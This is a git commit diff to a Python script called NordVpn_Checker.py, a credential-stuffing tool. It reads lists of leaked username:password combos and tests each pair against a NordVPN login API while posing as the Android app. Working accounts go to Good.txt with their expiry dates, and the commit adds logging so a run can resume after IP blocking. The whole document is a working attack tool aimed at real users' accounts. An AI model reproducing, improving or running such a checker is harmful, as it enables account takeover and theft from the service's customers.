d8eb139bdaadcd64a97cd6babdb65704351ccf2a
AmirHosein Abdollahi <amir.typer98@gmail.com>
2020-06-27 21:09:55 +0430

    Update NordVpn_Checker.py

--- NordVpn_Checker.py
+++ NordVpn_Checker.py
@@ -13,20 +13,26 @@ welcome = """
 """
 print(welcome)
 def login(combo):
-    url = "https://zwyr157wwiu6eior.com/v1/users/tokens"
-    headers = {
+    try:
+        
+        url = "https://zwyr157wwiu6eior.com/v1/users/tokens"
+        headers = {
     "accept": "*/*",
     "user-agent": "NordApp android (playstore/2.7.3) Android 8.1.0",
     "content-type": "application/x-www-form-urlencoded",
 }
-    data = combo.split(":")
-    r = requests.post(url, headers=headers, data="username="+data[0]+"&password="+data[1])
-    f= open("c.sz","w+")
-    f.write(r.text)
-    f.close()
-    return r.text
+          
+        data = combo.split(":")
+        r = requests.post(url, headers=headers, data="username="+data[0]+"&password="+data[1])
+        f= open("c.sz","w+")
+        f.write(r.text)
+        f.close()
+        return r.text
+    
+    except:
+        print ("error: check your internet or change your ip and try again")
 x=""
-def main():
+def main(): 
     list = open(input("ComboList: "), "r").read().splitlines()
     print(x)
     for combo in list:
@@ -36,7 +42,7 @@ def main():
             test_str =str(fopen)
             matches = re.finditer(regex, test_str, re.MULTILINE)
             for matchNum, match in enumerate(matches, start=1):                
-                for groupNum in range(0, len(match.groups())): 
+                for groupNum in range(0, len(match.groups())):
                     groupNum = groupNum + 1        
                     token = "{group}".format(groupNum = groupNum, start = match.start(groupNum), end = match.end(groupNum), group = match.group(groupNum))
                     message = "token:"+token
@@ -58,13 +64,12 @@ def main():
                     test_str2 =cap
                     matches2 = re.finditer(regex2, test_str2, re.MULTILINE)
                     for matchNum2, match in enumerate(matches2, start=1):                 
-                        for groupNum2 in range(0, len(match.groups())):                  
+                        for groupNum2 in range(0, len(match.groups())):
                             groupNum2 = groupNum2 + 1                       
                             exp = "{group}".format(groupNum2 = groupNum2, start = match.start(groupNum2), end = match.end(groupNum2), group = match.group(groupNum2))
                             #print(exp)
-                            
+            
             try:
-
                 f = open("Good.txt", "a")
                 f.write(combo+"  -----> Good | Date = " + str(exp) + "\n")
                 f.close()
@@ -75,16 +80,21 @@ def main():
                 f.close()
         else:
             if "nginx" in login(combo):
+                last = open("last","a")
+                last.write(combo)
                 print ("error: check your internet or change your ip and try again")
+                if "name=" not in str(last):             
+                    print("Last Combo: "+str(last))
+                else:
+                    pass
+                last.close()
                 return
-            else:   
+            else:
                 print (combo+"  -----> Bad")
-        
-
-
+    
 if __name__ == "__main__":
     main()
 
 #1399/04/07
 #27/6/2020
-    
+
